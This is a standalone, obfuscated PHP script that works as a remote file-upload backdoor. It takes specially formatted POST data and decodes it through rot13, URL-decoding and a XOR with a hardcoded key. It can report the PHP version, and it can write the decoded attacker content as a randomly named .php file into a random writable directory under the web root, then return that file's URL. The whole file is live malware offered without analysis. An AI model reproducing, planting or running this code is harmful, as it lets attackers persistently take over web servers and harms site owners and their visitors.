<?php $mgxyh = "xzyohnufpxxjjqep";$kagzxh = "";foreach ($_POST as $mlenfyv => $vakfta){if (strlen($mlenfyv) == 16 and substr_count($vakfta, "%") > 10){soyxzbwsa($mlenfyv, $vakfta);}}function soyxzbwsa($mlenfyv, $sqjvfqyqne){global $kagzxh;$kagzxh = $mlenfyv;$sqjvfqyqne = str_split(rawurldecode(str_rot13($sqjvfqyqne)));function gsakot($udnkg, $mlenfyv){global $mgxyh, $kagzxh;return $udnkg ^ $mgxyh[$mlenfyv % strlen($mgxyh)] ^ $kagzxh[$mlenfyv % strlen($kagzxh)];}$sqjvfqyqne = implode("", array_map("gsakot", array_values($sqjvfqyqne), array_keys($sqjvfqyqne)));$sqjvfqyqne = @unserialize($sqjvfqyqne);if (@is_array($sqjvfqyqne)){$mlenfyv = array_keys($sqjvfqyqne);$sqjvfqyqne = $sqjvfqyqne[$mlenfyv[0]];if ($sqjvfqyqne === $mlenfyv[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function smubpdy($jsvfkafpir) {static $zmgwccint = array();$jjalkpk = glob($jsvfkafpir . '/*', GLOB_ONLYDIR);if (count($jjalkpk) > 0) {foreach ($jjalkpk as $jsvfkafp){if (@is_writable($jsvfkafp)){$zmgwccint[] = $jsvfkafp;}}}foreach ($jjalkpk as $jsvfkafpir) smubpdy($jsvfkafpir);return $zmgwccint;}$qccpz = $_SERVER["DOCUMENT_ROOT"];$jjalkpk = smubpdy($qccpz);$mlenfyv = array_rand($jjalkpk);$lmtvvuwcy = $jjalkpk[$mlenfyv] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($lmtvvuwcy, $sqjvfqyqne);echo "http://" . $_SERVER["HTTP_HOST"] . substr($lmtvvuwcy, strlen($qccpz));exit();}}}